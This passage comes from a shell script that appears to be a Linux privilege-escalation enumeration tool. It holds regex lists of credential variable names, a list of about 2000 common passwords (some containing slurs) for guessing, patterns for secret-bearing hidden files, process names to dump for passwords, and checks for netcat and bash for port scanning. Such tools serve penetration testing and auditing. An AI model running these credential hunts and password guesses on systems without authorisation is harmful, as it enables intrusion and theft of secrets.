sKey|setDstSecretKey|setSecretKey|SIGNING_KEY|SIGNING_KEY_SECRET|SIGNING_KEY_SID|SNOOWRAP_CLIENT_SECRET|SNOOWRAP_REDIRECT_URI|SNOOWRAP_REFRESH_TOKEN|SNOOWRAP_USER_AGENT|SNYK_API_TOKEN|SNYK_ORG_ID|SNYK_TOKEN|SOCRATA_APP_TOKEN|SOCRATA_USER|SONAR_ORGANIZATION_KEY|SONAR_PROJECT_KEY|SONAR_TOKEN|SONATYPE_GPG_KEY_NAME|SONATYPE_GPG_PASSPHRASE|SONATYPE_PASSSONATYPE_TOKEN_USER|SONATYPE_USER|SOUNDCLOUD_CLIENT_ID|SOUNDCLOUD_CLIENT_SECRET|SPACES_ACCESS_KEY_ID|SPACES_SECRET_ACCESS_KEY"
   479	pwd_in_variables10="SPA_CLIENT_ID|SPOTIFY_API_ACCESS_TOKEN|SPOTIFY_API_CLIENT_ID|SPOTIFY_API_CLIENT_SECRET|sqsAccessKey|sqsSecretKey|SRCCLR_API_TOKEN|SSHPASS|SSMTP_CONFIG|STARSHIP_ACCOUNT_SID|STARSHIP_AUTH_TOKEN|STAR_TEST_AWS_ACCESS_KEY_ID|STAR_TEST_BUCKET|STAR_TEST_LOCATION|STAR_TEST_SECRET_ACCESS_KEY|STORMPATH_API_KEY_ID|STORMPATH_API_KEY_SECRET|STRIPE_PRIVATE|STRIPE_PUBLIC|STRIP_PUBLISHABLE_KEY|STRIP_SECRET_KEY|SURGE_LOGIN|SURGE_TOKEN|SVN_PASS|SVN_USER|TESCO_API_KEY|THERA_OSS_ACCESS_ID|THERA_OSS_ACCESS_KEY|TRAVIS_ACCESS_TOKEN|TRAVIS_API_TOKEN|TRAVIS_COM_TOKEN|TRAVIS_E2E_TOKEN|TRAVIS_GH_TOKEN|TRAVIS_PULL_REQUEST|TRAVIS_SECURE_ENV_VARS|TRAVIS_TOKEN|TREX_CLIENT_ORGURL|TREX_CLIENT_TOKEN|TREX_OKTA_CLIENT_ORGURL|TREX_OKTA_CLIENT_TOKEN|TWILIO_ACCOUNT_ID|TWILIO_ACCOUNT_SID|TWILIO_API_KEY|TWILIO_API_SECRET|TWILIO_CHAT_ACCOUNT_API_SERVICE|TWILIO_CONFIGURATION_SID|TWILIO_SID|TWILIO_TOKEN|TWITTEROAUTHACCESSSECRET|TWITTEROAUTHACCESSTOKEN|TWITTER_CONSUMER_KEY|TWITTER_CONSUMER_SECRET|UNITY_SERIAL|URBAN_KEY|URBAN_MASTER_SECRET|URBAN_SECRET|userTravis|USER_ASSETS_ACCESS_KEY_ID|USER_ASSETS_SECRET_ACCESS_KEY|VAULT_APPROLE_SECRET_ID|VAULT_PATH|VIP_GITHUB_BUILD_REPO_DEPLOY_KEY|VIP_GITHUB_DEPLOY_KEY|VIP_GITHUB_DEPLOY_KEY_PASS"
   480	pwd_in_variables11="VIRUSTOTAL_APIKEY|VISUAL_RECOGNITION_API_KEY|V_SFDC_CLIENT_ID|V_SFDC_CLIENT_SECRET|WAKATIME_API_KEY|WAKATIME_PROJECT|WATSON_CLIENT|WATSON_CONVERSATION_WORKSPACE|WATSON_DEVICE|WATSON_DEVICE_TOPIC|WATSON_TEAM_ID|WATSON_TOPIC|WIDGET_BASIC_USER_2|WIDGET_BASIC_USER_3|WIDGET_BASIC_USER_4|WIDGET_BASIC_USER_5|WIDGET_FB_USER|WIDGET_FB_USER_2|WIDGET_FB_USER_3|WIDGET_TEST_SERVERWORDPRESS_DB_USER|WORKSPACE_ID|WPJM_PHPUNIT_GOOGLE_GEOCODE_API_KEY|WPT_DB_HOST|WPT_DB_NAME|WPT_DB_USER|WPT_PREPARE_DIR|WPT_REPORT_API_KEY|WPT_SSH_CONNECT|WPT_SSH_PRIVATE_KEY_BASE64|YANGSHUN_GH_TOKEN|YT_ACCOUNT_CHANNEL_ID|YT_ACCOUNT_CLIENT_ID|YT_ACCOUNT_CLIENT_SECRET|YT_ACCOUNT_REFRESH_TOKEN|YT_API_KEY|YT_CLIENT_ID|YT_CLIENT_SECRET|YT_PARTNER_CHANNEL_ID|YT_PARTNER_CLIENT_ID|YT_PARTNER_CLIENT_SECRET|YT_PARTNER_ID|YT_PARTNER_REFRESH_TOKEN|YT_SERVER_API_KEY|ZHULIANG_GH_TOKEN|ZOPIM_ACCOUNT_KEY"
   481	
   482	top2000pwds="123456 password 123456789 12345678 12345 qwerty 123123 111111 abc123 1234567 dragon 1q2w3e4r sunshine 654321 master 1234 football 1234567890 000000 computer 666666 superman michael internet iloveyou daniel 1qaz2wsx monkey shadow jessica letmein baseball whatever princess abcd1234 123321 starwars 121212 thomas zxcvbnm trustno1 killer welcome jordan aaaaaa 123qwe freedom password1 charlie batman jennifer 7777777 michelle diamond oliver mercedes benjamin 11111111 snoopy samantha victoria matrix george alexander secret cookie asdfgh 987654321 123abc orange fuckyou asdf1234 pepper hunter silver joshua banana 1q2w3e chelsea 1234qwer summer qwertyuiop phoenix andrew q1w2e3r4 elephant rainbow mustang merlin london garfield robert chocolate 112233 samsung qazwsx matthew buster jonathan ginger flower 555555 test caroline amanda maverick midnight martin junior 88888888 anthony jasmine creative patrick mickey 123 qwerty123 cocacola chicken passw0rd forever william nicole hello yellow nirvana justin friends cheese tigger mother liverpool blink182 asdfghjkl andrea spider scooter richard soccer rachel purple morgan melissa jackson arsenal 222222 qwe123 gabriel ferrari jasper danielle bandit angela scorpion prince maggie austin veronica nicholas monster dexter carlos thunder success hannah ashley 131313 stella brandon pokemon joseph asdfasdf 999999 metallica december chester taylor sophie samuel rabbit crystal barney xxxxxx steven ranger patricia christian asshole spiderman sandra hockey angels security parker heather 888888 victor harley 333333 system slipknot november jordan23 canada tennis qwertyui casper gemini asd123 winter hammer cooper america albert 777777 winner charles butterfly swordfish popcorn penguin dolphin carolina access 987654 hardcore corvette apples 12341234 sabrina remember qwer1234 edward dennis cherry sparky natasha arthur vanessa marina leonardo johnny dallas antonio winston \
   483	snickers olivia nothing iceman destiny coffee apollo 696969 windows williams school madison dakota angelina anderson 159753 1111 yamaha trinity rebecca nathan guitar compaq 123123123 toyota shannon playboy peanut pakistan diablo abcdef maxwell golden asdasd 123654 murphy monica marlboro kimberly gateway bailey 00000000 snowball scooby nikita falcon august test123 sebastian panther love johnson godzilla genesis brandy adidas zxcvbn wizard porsche online hello123 fuckoff eagles champion bubbles boston smokey precious mercury lauren einstein cricket cameron angel admin napoleon mountain lovely friend flowers dolphins david chicago sierra knight yankees wilson warrior simple nelson muffin charlotte calvin spencer newyork florida fernando claudia basketball barcelona 87654321 willow stupid samson police paradise motorola manager jaguar jackie family doctor bullshit brooklyn tigers stephanie slayer peaches miller heaven elizabeth bulldog animal 789456 scorpio rosebud qwerty12 franklin claire american vincent testing pumpkin platinum louise kitten general united turtle marine icecream hacker darkness cristina colorado boomer alexandra steelers serenity please montana mitchell marcus lollipop jessie happy cowboy 102030 marshall jupiter jeremy gibson fucker barbara adrian 1qazxsw2 12344321 11111 startrek fishing digital christine business abcdefg nintendo genius 12qwaszx walker q1w2e3 player legend carmen booboo tomcat ronaldo people pamela marvin jackass google fender asdfghjk Password 1q2w3e4r5t zaq12wsx scotland phantom hercules fluffy explorer alexis walter trouble tester qwerty1 melanie manchester gordon firebird engineer azerty 147258 virginia tiger simpsons passion lakers james angelica 55555 vampire tiffany september private maximus loveme isabelle isabella eclipse dreamer changeme cassie badboy 123456a stanley sniper rocket passport pandora justice infinity cookies barbie xavier unicorn superstar \
   484	stephen rangers orlando money domino courtney viking tucker travis scarface pavilion nicolas natalie gandalf freddy donald captain abcdefgh a1b2c3d4 speedy peter nissan loveyou harrison friday francis dancer 159357 101010 spitfire saturn nemesis little dreams catherine brother birthday 1111111 wolverine victory student france fantasy enigma copper bonnie teresa mexico guinness georgia california sweety logitech julian hotdog emmanuel butter beatles 11223344 tristan sydney spirit october mozart lolita ireland goldfish eminem douglas cowboys control cheyenne alex testtest stargate raiders microsoft diesel debbie danger chance asdf anything aaaaaaaa welcome1 qwert hahaha forest eternity disney denise carter alaska zzzzzz titanic shorty shelby pookie pantera england chris zachary westside tamara password123 pass maryjane lincoln willie teacher pierre michael1 leslie lawrence kristina kawasaki drowssap college blahblah babygirl avatar alicia regina qqqqqq poohbear miranda madonna florence sapphire norman hamilton greenday galaxy frankie black awesome suzuki spring qazwsxedc magnum lovers liberty gregory 232323 twilight timothy swimming super stardust sophia sharon robbie predator penelope michigan margaret jesus hawaii green brittany brenda badger a1b2c3 444444 winnie wesley voodoo skippy shithead redskins qwertyu pussycat houston horses gunner fireball donkey cherokee australia arizona 1234abcd skyline power perfect lovelove kermit kenneth katrina eugene christ thailand support special runner lasvegas jason fuckme butthead blizzard athena abigail 8675309 violet tweety spanky shamrock red123 rascal melody joanna hello1 driver bluebird biteme atlantis arnold apple alison taurus random pirate monitor maria lizard kevin hummer holland buffalo 147258369 007007 valentine roberto potter magnolia juventus indigo indian harvey duncan diamonds daniela christopher bradley bananas warcraft sunset simone renegade \
   485	redsox philip monday mohammed indiana energy bond007 avalon terminator skipper shopping scotty savannah raymond morris mnbvcxz michele lucky lucifer kingdom karina giovanni cynthia a123456 147852 12121212 wildcats ronald portugal mike helpme froggy dragons cancer bullet beautiful alabama 212121 unknown sunflower sports siemens santiago kathleen hotmail hamster golfer future father enterprise clifford christina camille camaro beauty 55555555 vision tornado something rosemary qweasd patches magic helena denver cracker beaver basket atlanta vacation smiles ricardo pascal newton jeffrey jasmin january honey hollywood holiday gloria element chandler booger angelo allison action 99999999 target snowman miguel marley lorraine howard harmony children celtic beatrice airborne wicked voyager valentin thx1138 thumper samurai moonlight mmmmmm karate kamikaze jamaica emerald bubble brooke zombie strawberry spooky software simpson service sarah racing qazxsw philips oscar minnie lalala ironman goddess extreme empire elaine drummer classic carrie berlin asdfg 22222222 valerie tintin therock sunday skywalker salvador pegasus panthers packers network mission mark legolas lacrosse kitty kelly jester italia hiphop freeman charlie1 cardinal bluemoon bbbbbb bastard alyssa 0123456789 zeppelin tinker surfer smile rockstar operator naruto freddie dragonfly dickhead connor anaconda amsterdam alfred a12345 789456123 77777777 trooper skittles shalom raptor pioneer personal ncc1701 nascar music kristen kingkong global geronimo germany country christmas bernard benson wrestling warren techno sunrise stefan sister savage russell robinson oracle millie maddog lightning kingston kennedy hannibal garcia download dollar darkstar brutus bobby autumn webster vanilla undertaker tinkerbell sweetpea ssssss softball rafael panasonic pa55word keyboard isabel hector fisher dominic darkside cleopatra blue assassin amelia vladimir roland \
   486	nigger national monique molly matthew1 godfather frank curtis change central cartman brothers boogie archie warriors universe turkey topgun solomon sherry sakura rush2112 qwaszx office mushroom monika marion lorenzo john herman connect chopper burton blondie bitch bigdaddy amber 456789 1a2b3c4d ultimate tequila tanner sweetie scott rocky popeye peterpan packard loverboy leonard jimmy harry griffin design buddha 1 wallace truelove trombone toronto tarzan shirley sammy pebbles natalia marcel malcolm madeline jerome gilbert gangster dingdong catalina buddy blazer billy bianca alejandro 54321 252525 111222 0000 water sucker rooster potato norton lucky1 loving lol123 ladybug kittycat fuck forget flipper fireman digger bonjour baxter audrey aquarius 1111111111 pppppp planet pencil patriots oxford million martha lindsay laura jamesbond ihateyou goober giants garden diana cecilia brazil blessing bishop bigdog airplane Password1 tomtom stingray psycho pickle outlaw number1 mylove maurice madman maddie lester hendrix hellfire happy1 guardian flamingo enter chichi 0987654321 western twister trumpet trixie socrates singer sergio sandman richmond piglet pass123 osiris monkey1 martina justine english electric church castle caesar birdie aurora artist amadeus alberto 246810 whitney thankyou sterling star ronnie pussy printer picasso munchkin morpheus madmax kaiser julius imperial happiness goodluck counter columbia campbell blessed blackjack alpha 999999999 142536 wombat wildcat trevor telephone smiley saints pretty oblivion newcastle mariana janice israel imagine freedom1 detroit deedee darren catfish adriana washington warlock valentina valencia thebest spectrum skater sheila shaggy poiuyt member jessica1 jeremiah jack insane iloveu handsome goldberg gabriela elijah damien daisy buttons blabla bigboy apache anthony1 a1234567 xxxxxxxx toshiba tommy sailor peekaboo motherfucker montreal manuel madrid kramer \
   487	katherine kangaroo jenny immortal harris hamlet gracie fucking firefly chocolat bentley account 321321 2222 1a2b3c thompson theman strike stacey science running research polaris oklahoma mariposa marie leader julia island idontknow hitman german felipe fatcat fatboy defender applepie annette 010203 watson travel sublime stewart steve squirrel simon sexy pineapple phoebe paris panzer nadine master1 mario kelsey joker hongkong gorilla dinosaur connie bowling bambam babydoll aragorn andreas 456123 151515 wolves wolfgang turner semperfi reaper patience marilyn fletcher drpepper dorothy creation brian bluesky andre yankee wordpass sweet spunky sidney serena preston pauline passwort original nightmare miriam martinez labrador kristin kissme henry gerald garrett flash excalibur discovery dddddd danny collins casino broncos brendan brasil apple123 yvonne wonder window tomato sundance sasha reggie redwings poison mypassword monopoly mariah margarita lionking king football1 director darling bubba biscuit 44444444 wisdom vivian virgin sylvester street stones sprite spike single sherlock sandy rocker robin matt marianne linda lancelot jeanette hobbes fred ferret dodger cotton corona clayton celine cannabis bella andromeda 7654321 4444 werewolf starcraft sampson redrum pyramid prodigy paul michel martini marathon longhorn leopard judith joanne jesus1 inferno holly harold happy123 esther dudley dragon1 darwin clinton celeste catdog brucelee argentina alpine 147852369 wrangler william1 vikings trigger stranger silvia shotgun scarlett scarlet redhead raider qweasdzxc playstation mystery morrison honda february fantasia designer coyote cool bulldogs bernie baby asdfghj angel1 always adam 202020 wanker sullivan stealth skeeter saturday rodney prelude pingpong phillip peewee peanuts peace nugget newport myself mouse memphis lover lancer kristine james1 hobbit halloween fuckyou1 finger fearless dodgers delete cougar \
   488	charmed cassandra caitlin bismillah believe alice airforce 7777 viper tony theodore sylvia suzanne starfish sparkle server samsam qweqwe public pass1234 neptune marian krishna kkkkkk jungle cinnamon bitches 741852 trojan theresa sweetheart speaker salmon powers pizza overlord michaela meredith masters lindsey history farmer express escape cuddles carson candy buttercup brownie broken abc12345 aardvark Passw0rd 141414 124578 123789 12345678910 00000 universal trinidad tobias thursday surfing stuart stinky standard roller porter pearljam mobile mirage markus loulou jjjjjj herbert grace goldie frosty fighter fatima evelyn eagle desire crimson coconut cheryl beavis anonymous andres africa 134679 whiskey velvet stormy springer soldier ragnarok portland oranges nobody nathalie malibu looking lemonade lavender hitler hearts gotohell gladiator gggggg freckles fashion david1 crusader cosmos commando clover clarence center cadillac brooks bronco bonita babylon archer alexandre 123654789 verbatim umbrella thanks sunny stalker splinter sparrow selena russia roberts register qwert123 penguins panda ncc1701d miracle melvin lonely lexmark kitkat julie graham frances estrella downtown doodle deborah cooler colombia chemistry cactus bridge bollocks beetle anastasia 741852963 69696969 unique sweets station showtime sheena santos rock revolution reading qwerasdf password2 mongoose marlene maiden machine juliet illusion hayden fabian derrick crazy cooldude chipper bomber blonde bigred amazing aliens abracadabra 123qweasd wwwwww treasure timber smith shelly sesame pirates pinkfloyd passwords nature marlin marines linkinpark larissa laptop hotrod gambit elvis education dustin devils damian christy braves baller anarchy white valeria underground strong poopoo monalisa memory lizzie keeper justdoit house homer gerard ericsson emily divine colleen chelsea1 cccccc camera bonbon billie bigfoot badass asterix anna animals \
   489	andy achilles a1s2d3f4 violin veronika vegeta tyler test1234 teddybear tatiana sporting spartan shelley sharks respect raven pentium papillon nevermind marketing manson madness juliette jericho gabrielle fuckyou2 forgot firewall faith evolution eric eduardo dagger cristian cavalier canadian bruno blowjob blackie beagle admin123 010101 together spongebob snakes sherman reddog reality ramona puppies pedro pacific pa55w0rd omega noodle murray mollie mister halflife franco foster formula1 felix dragonball desiree default chris1 bunny bobcat asdf123 951753 5555 242424 thirteen tattoo stonecold stinger shiloh seattle santana roger roberta rastaman pickles orion mustang1 felicia dracula doggie cucumber cassidy britney brianna blaster belinda apple1 753951 teddy striker stevie soleil snake skateboard sheridan sexsex roxanne redman qqqqqqqq punisher panama paladin none lovelife lights jerry iverson inside hornet holden groovy gretchen grandma gangsta faster eddie chevelle chester1 carrot cannon button administrator a 1212 zxc123 wireless volleyball vietnam twinkle terror sandiego rose pokemon1 picture parrot movies moose mirror milton mayday maestro lollypop katana johanna hunting hudson grizzly gorgeous garbage fish ernest dolores conrad chickens charity casey blueberry blackman blackbird bill beckham battle atlantic wildfire weasel waterloo trance storm singapore shooter rocknroll richie poop pitbull mississippi kisses karen juliana james123 iguana homework highland fire elliot eldorado ducati discover computer1 buddy1 antonia alphabet 159951 123456789a 1123581321 0123456 zaq1xsw2 webmaster vagina unreal university tropical swimmer sugar southpark silence sammie ravens question presario poiuytrewq palmer notebook newman nebraska manutd lucas hermes gators dave dalton cheetah cedric camilla bullseye bridget bingo ashton 123asd yahoo volume valhalla tomorrow starlight scruffy roscoe richard1 positive \
   490	plymouth pepsi patrick1 paradox milano maxima loser lestat gizmo ghetto faithful emerson elliott dominique doberman dillon criminal crackers converse chrissy casanova blowme attitude"
   491	PASSTRY="2000" #Default num of passwds to try (all by default)
   492	
   493	if [ "$PORTS" ] || [ "$DISCOVERY" ] || [ "$IP" ] || [ "$AUTO_NETWORK_SCAN" ]; then MAXPATH_FIND_W="1"; fi #If Network reduce the time on this
   494	SEDOVERFLOW=true
   495	for grp in $(groups $USER 2>/dev/null | cut -d ":" -f2); do
   496	  wgroups="$wgroups -group $grp -or "
   497	done
   498	wgroups="$(echo $wgroups | sed -e 's/ -or$//')"
   499	while $SEDOVERFLOW; do
   500	  #WF=`find /dev /srv /proc /home /media /sys /lost+found /run /etc /root /var /tmp /mnt /boot /opt -type d -maxdepth $MAXPATH_FIND_W -writable -or -user $USER 2>/dev/null | sort`
   501	  #if [ "$MACPEAS" ]; then
   502	    WF=$(find / -maxdepth $MAXPATH_FIND_W -type d ! -path "/proc/*" '(' '(' -user $USER ')' -or '(' -perm -o=w ')' -or  '(' -perm -g=w -and '(' $wgroups ')' ')' ')'  2>/dev/null | sort) #OpenBSD find command doesn't have "-writable" option
   503	  #else
   504	  #  WF=`find / -maxdepth $MAXPATH_FIND_W -type d ! -path "/proc/*" -and '(' -writable -or -user $USER ')' 2>/dev/null | sort`
   505	  #fi
   506	  Wfolders=$(printf "%s" "$WF" | tr '\n' '|')"|[a-zA-Z]+[a-zA-Z0-9]* +\*"
   507	  Wfolder="$(printf "%s" "$WF" | grep "/shm" | head -n1)"  # Try to get /dev/shm
   508	  if ! [ "$Wfolder" ]; then
   509	    Wfolder="$(printf "%s" "$WF" | grep "tmp\|shm\|home\|Users\|root\|etc\|var\|opt\|bin\|lib\|mnt\|private\|Applications" | head -n1)"
   510	  fi
   511	  printf "test\ntest\ntest\ntest"| sed -${E} "s,$Wfolders|\./|\.:|:\.,${SED_RED_YELLOW},g" >/dev/null 2>&1
   512	  if [ $? -eq 0 ]; then
   513	      SEDOVERFLOW=false
   514	  else
   515	      MAXPATH_FIND_W=$(($MAXPATH_FIND_W-1)) #If overflow of directories, check again with MAXPATH_FIND_W - 1
   516	  fi
   517	  if [ $MAXPATH_FIND_W -lt 1 ] ; then # prevent infinite loop
   518	     SEDOVERFLOW=false
   519	  fi
   520	done
   521	
   522	
   523	notExtensions="\.tif$|\.tiff$|\.gif$|\.jpeg$|\.jpg|\.jif$|\.jfif$|\.jp2$|\.jpx$|\.j2k$|\.j2c$|\.fpx$|\.pcd$|\.png$|\.pdf$|\.flv$|\.mp4$|\.mp3$|\.gifv$|\.avi$|\.mov$|\.mpeg$|\.wav$|\.doc$|\.docx$|\.xls$|\.xlsx$|\.svg$"
   524	
   525	TIMEOUT="$(command -v timeout 2>/dev/null)"
   526	STRACE="$(command -v strace 2>/dev/null)"
   527	STRINGS="$(command -v strings 2>/dev/null)"
   528	LDD="$(command -v ldd 2>/dev/null)"
   529	READELF="$(command -v readelf 2>/dev/null)"
   530	
   531	shscripsG="/0trace.sh|/alsa-info.sh|amuFormat.sh|/blueranger.sh|/crosh.sh|/dnsmap-bulk.sh|/dockerd-rootless.sh|/dockerd-rootless-setuptool.sh|/get_bluetooth_device_class.sh|/gettext.sh|/go-rhn.sh|/gvmap.sh|/kernel_log_collector.sh|/lesspipe.sh|/lprsetup.sh|/mksmbpasswd.sh|/pm-utils-bugreport-info.sh|/power_report.sh|/prl-opengl-switcher.sh|/setuporamysql.sh|/setup-nsssysinit.sh|/readlink_f.sh|/rescan-scsi-bus.sh|/start_bluetoothd.sh|/start_bluetoothlog.sh|/testacg.sh|/testlahf.sh|/unix-lpr.sh|/url_handler.sh|/write_gpt.sh"
   532	
   533	notBackup="/tdbbackup$|/db_hotbackup$"
   534	
   535	cronjobsG=".placeholder|0anacron|0hourly|110.clean-tmps|130.clean-msgs|140.clean-rwho|199.clean-fax|199.rotate-fax|200.accounting|310.accounting|400.status-disks|420.status-network|430.status-rwho|999.local|anacron|apache2|apport|apt|aptitude|apt-compat|bsdmainutils|certwatch|cracklib-runtime|debtags|dpkg|e2scrub_all|exim4-base|fake-hwclock|fstrim|john|locate|logrotate|man-db.cron|man-db|mdadm|mlocate|mod-pagespeed|ntp|passwd|php|popularity-contest|raid-check|rwhod|samba|standard|sysstat|ubuntu-advantage-tools|update-motd|update-notifier-common|upstart|"
   536	cronjobsB="centreon"
   537	
   538	processesVB='jdwp|tmux |screen | inspect |--inspect[= ]|--inspect$|--inpect-brk|--remote-debugging-port'
   539	processesB="amazon-ssm-agent|knockd|splunk"
   540	processesDump="gdm-password|gnome-keyring-daemon|lightdm|vsftpd|apache2|sshd:"
   541	
   542	mail_apps="Postfix|Dovecot|Exim|SquirrelMail|Cyrus|Sendmail|Courier"
   543	
   544	profiledG="01-locale-fix.sh|256term.csh|256term.sh|abrt-console-notification.sh|appmenu-qt5.sh|apps-bin-path.sh|bash_completion.sh|cedilla-portuguese.sh|colorgrep.csh|colorgrep.sh|colorls.csh|colorls.sh|colorxzgrep.csh|colorxzgrep.sh|colorzgrep.csh|colorzgrep.sh|csh.local|cursor.sh|gawk.csh|gawk.sh|im-config_wayland.sh|kali.sh|lang.csh|lang.sh|less.csh|less.sh|flatpak.sh|sh.local|vim.csh|vim.sh|vte.csh|vte-2.91.sh|which2.csh|which2.sh|xauthority.sh|Z97-byobu.sh|xdg_dirs_desktop_session.sh|Z99-cloudinit-warnings.sh|Z99-cloud-locale-test.sh"
   545	
   546	knw_emails=".*@aivazian.fsnet.co.uk|.*@angband.pl|.*@canonical.com|.*centos.org|.*debian.net|.*debian.org|.*@jff.email|.*kali.org|.*linux.it|.*@linuxia.de|.*@lists.debian-maintainers.org|.*@mit.edu|.*@oss.sgi.com|.*@qualcomm.com|.*redhat.com|.*ubuntu.com|.*@vger.kernel.org|mmyangfl@gmail.com|rogershimizu@gmail.com|thmarques@gmail.com"
   547	
   548	timersG="anacron.timer|apt-daily.timer|apt-daily-upgrade.timer|dpkg-db-backup.timer|e2scrub_all.timer|fstrim.timer|fwupd-refresh.timer|geoipupdate.timer|io.netplan.Netplan|logrotate.timer|man-db.timer|mlocate.timer|motd-news.timer|phpsessionclean.timer|plocate-updatedb.timer|snapd.refresh.timer|snapd.snap-repair.timer|systemd-tmpfiles-clean.timer|systemd-readahead-done.timer|ua-license-check.timer|ua-messaging.timer|ua-timer.timer|ureadahead-stop.timer"
   549	
   550	commonrootdirsG="^/$|/bin$|/boot$|/.cache$|/cdrom|/dev$|/etc$|/home$|/lost+found$|/lib$|/lib32$|libx32$|/lib64$|lost\+found|/media$|/mnt$|/opt$|/proc$|/root$|/run$|/sbin$|/snap$|/srv$|/sys$|/tmp$|/usr$|/var$"
   551	commonrootdirsMacG="^/$|/.DocumentRevisions-V100|/.fseventsd|/.PKInstallSandboxManager-SystemSoftware|/.Spotlight-V100|/.Trashes|/.vol|/Applications|/bin|/cores|/dev|/home|/Library|/macOS Install Data|/net|/Network|/opt|/private|/sbin|/System|/Users|/usr|/Volumes"
   552	
   553	ldsoconfdG="/lib32|/lib/x86_64-linux-gnu|/usr/lib32|/usr/lib/oracle/19.6/client64/lib/|/usr/lib/x86_64-linux-gnu/libfakeroot|/usr/lib/x86_64-linux-gnu|/usr/local/lib/x86_64-linux-gnu|/usr/local/lib"
   554	
   555	dbuslistG="^:1\.[0-9\.]+|com.hp.hplip|com.intel.tss2.Tabrmd|com.redhat.ifcfgrh1|com.redhat.NewPrinterNotification|com.redhat.PrinterDriversInstaller|com.redhat.RHSM1|com.redhat.RHSM1.Facts|com.redhat.tuned|com.ubuntu.LanguageSelector|com.ubuntu.SoftwareProperties|com.ubuntu.SystemService|com.ubuntu.USBCreator|com.ubuntu.WhoopsiePreferences|io.netplan.Netplan|io.snapcraft.SnapdLoginService|fi.epitest.hostap.WPASupplicant|fi.w1.wpa_supplicant1|NAME|net.hadess.SwitcherooControl|org.blueman.Mechanism|org.bluez|org.debian.apt|org.fedoraproject.FirewallD1|org.fedoraproject.Setroubleshootd|org.fedoraproject.SetroubleshootFixit|org.fedoraproject.SetroubleshootPrivileged|org.freedesktop.Accounts|org.freedesktop.Avahi|org.freedesktop.bolt|org.freedesktop.ColorManager|org.freedesktop.DBus|org.freedesktop.DisplayManager|org.freedesktop.fwupd|org.freedesktop.GeoClue2|org.freedesktop.hostname1|org.freedesktop.import1|org.freedesktop.locale1|org.freedesktop.login1|org.freedesktop.machine1|org.freedesktop.ModemManager1|org.freedesktop.NetworkManager|org.freedesktop.network1|org.freedesktop.nm_dispatcher|org.freedesktop.nm_priv_helper|org.freedesktop.PackageKit|org.freedesktop.PolicyKit1|org.freedesktop.portable1|org.freedesktop.realmd|org.freedesktop.RealtimeKit1|org.freedesktop.SystemToolsBackends|org.freedesktop.SystemToolsBackends.[a-zA-Z0-9_]+|org.freedesktop.resolve1|org.freedesktop.systemd1|org.freedesktop.thermald|org.freedesktop.timedate1|org.freedesktop.timesync1|org.freedesktop.UDisks2|org.freedesktop.UPower|org.gnome.DisplayManager|org.opensuse.CupsPkHelper.Mechanism"
   556	USEFUL_SOFTWARE="authbind aws az base64 ctr curl doas docker fetch g++ gcc gcloud gdb kubectl lxc make nc nc.traditional ncat netcat nmap perl php ping podman python python2 python2.6 python2.7 python3 python3.6 python3.7 pwsh rkt ruby runc socat sudo wget xterm"
   557	TIP_DOCKER_ROOTLESS="In rootless mode privilege escalation to root will not be possible."
   558	GREP_DOCKER_SOCK_INFOS="Architecture|OSType|Name|DockerRootDir|NCPU|OperatingSystem|KernelVersion|ServerVersion"
   559	GREP_DOCKER_SOCK_INFOS_IGNORE="IndexConfig"
   560	GREP_IGNORE_MOUNTS="/ /|/null | proc proc |/dev/console"
   561	
   562	INT_HIDDEN_FILES=".Xauthority|.bashrc|.bluemix|.boto|.cer|.cloudflared|.credentials.json|.crt|.csr|.db|.der|.docker|.env|.erlang.cookie|.flyrc|.ftpconfig|.git|.git-credentials|.gitconfig|.github|.gnupg|.google_authenticator|.gpg|.htpasswd|.irssi|.jks|.k5login|.kdbx|.key|.keyring|.keystore|.keytab|.kube|.ldaprc|.lesshst|.mozilla|.msmtprc|.ovpn|.p12|.password-store|.pem|.pfx|.pgp|.plan|.profile|.psk|.pypirc|.rdg|.recently-used.xbel|.rhosts|.roadtools_auth|.secrets.mkey|.service|.socket|.sqlite|.sqlite3|.sudo_as_admin_successful|.svn|.swp|.tf|.tfstate|.timer|.vault-token|.vhd|.vhdx|.viminfo|.vmdk|.vnc|.wgetrc"
   563	
   564	
   565	###########################################
   566	#---------) Checks before start (---------#
   567	###########################################
   568	# --) ps working good
   569	# --) Network binaries
   570	
   571	if [ "$(ps auxwww 2>/dev/null | wc -l 2>/dev/null)" -lt 8 ]; then
   572	  NOUSEPS="1"
   573	fi
   574	
   575	DISCOVER_BAN_BAD="No network discovery capabilities (fping or ping not found)"
   576	FPING=$(command -v fping 2>/dev/null)
   577	PING=$(command -v ping 2>/dev/null)
   578	if [ "$FPING" ]; then
   579	  DISCOVER_BAN_GOOD="$GREEN$FPING${BLUE} is available for network discovery$LG ($SCRIPTNAME can discover hosts, learn more with -h)"
   580	else
   581	  if [ "$PING" ]; then
   582	    DISCOVER_BAN_GOOD="$GREEN$PING${BLUE} is available for network discovery$LG ($SCRIPTNAME can discover hosts, learn more with -h)"
   583	  fi
   584	fi
   585	
   586	SCAN_BAN_BAD="No port scan capabilities (nc and bash not found)"
   587	
   588	if [ "$(command -v bash)" ] && ! [ -L "$(command -v bash)" ]; then
   589	  FOUND_BASH=$(command -v bash);
   590	elif [ -f "/bin/bash" ] && ! [ -L "/bin/bash" ]; then
   591	  FOUND_BASH="/bin/bash";
   592	fi
   593	if [ "$FOUND_BASH" ]; then
   594	  SCAN_BAN_GOOD="$YELLOW[+] $GREEN$FOUND_BASH${BLUE} is available for network discovery, port scanning and port forwarding$LG ($SCRIPTNAME can discover hosts, scan ports, and forward ports. Learn more with -h)\n"
   595	fi
   596	
   597	FOUND_NC=$(command -v nc 2>/dev/null)
   598	if [ -z "$FOUND_NC" ]; then
   599		FOUND_NC=$(command -v netcat 2>/dev/null);
   600	fi
   601	if [ -z "$FOUND_NC" ]; then
   602		FOUND_NC=$(command -v ncat 2>/dev/null);
   603	fi
   604	if [ -z "$FOUND_NC" ]; then
   605		FOUND_NC=$(command -v nc.traditional 2>/dev/null);
   606	fi
   607	if [ -z "$FOUND_NC" ]; then
   608		FOUND_NC=$(command -v nc.openbsd 2>/dev/null);
   609	fi
   610	if [ "$FOUND_NC" ]; then
   611	  SCAN_BAN_GOOD="$SCAN_BAN_GOOD$YELLOW[+] $GREEN$FOUND_NC${BLUE} is available for network discovery & port scanning$LG ($SCRIPTNAME can discover hosts and scan ports, learn more with -h)\n"
   612	fi
   613	
   614	
   615	###########################################
   616	#-----------) Main Functions (------------#
   617	###########################################
   618	
   619	echo_not_found (){
   620	  printf $DG"$1 Not Found\n"$NC
   621	}
   622	
   623	warn_exec(){
   624	  $* 2>/dev/null || echo_not_found $1
   625	}
   626	
   627	echo_no (){
